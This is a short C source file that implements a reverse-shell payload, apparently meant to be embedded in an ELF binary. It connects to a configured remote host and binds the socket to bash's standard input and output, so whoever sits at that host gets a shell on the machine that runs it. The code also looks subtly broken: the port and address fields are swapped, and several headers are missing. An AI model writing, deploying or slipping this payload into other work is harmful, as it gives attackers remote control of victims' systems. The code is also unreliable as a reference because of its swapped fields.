
#include "payload.h"
#include "setup.h"
#include <netinet/in.h>
#include <unistd.h>

int setup_socket(settings_t *g_settings)
{
    int flag = 1;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(atoi(g_settings->target_ip)),
        .sin_addr.s_addr = strcmp(g_settings->target_ip, DEFAULT_IP) != 0 ?
         inet_addr(g_settings->target_port) : INADDR_ANY
    };

    printf("[+] Initiating connection to %s:%s\n",
    g_settings->target_ip, g_settings->target_port);
    g_settings->sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (g_settings->sockfd == -1) {
        printf("[!] Failure to build socket: %s\n", strerror(errno));
        return -1;
    } else if (setsockopt(g_settings->sockfd, SOL_SOCKET,
        SO_REUSEADDR | SO_REUSEPORT, &flag, sizeof(int)) < 0) {
        printf("[!] Failure to set socket options: %s\n", strerror(errno));
        return -1;
    } else if (connect(g_settings->sockfd,
    (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("[!] Failure to connect: %s\n", strerror(errno));
        return -1;
    }
    printf("[+] Connected!\n");
    return g_settings->sockfd;
}

SECTION(ELF_CODE)
void setup_payload(settings_t *g_settings)
{
    char * const argv[] = {"/bin/bash", NULL};

    g_settings->sockfd = setup_socket(g_settings);

    printf("[+] Starting revshell.\n");
    dup2(g_settings->sockfd, 0);
    dup2(g_settings->sockfd, 1);
    dup2(g_settings->sockfd, 2);
    execve("/bin/bash", argv, environ);
}
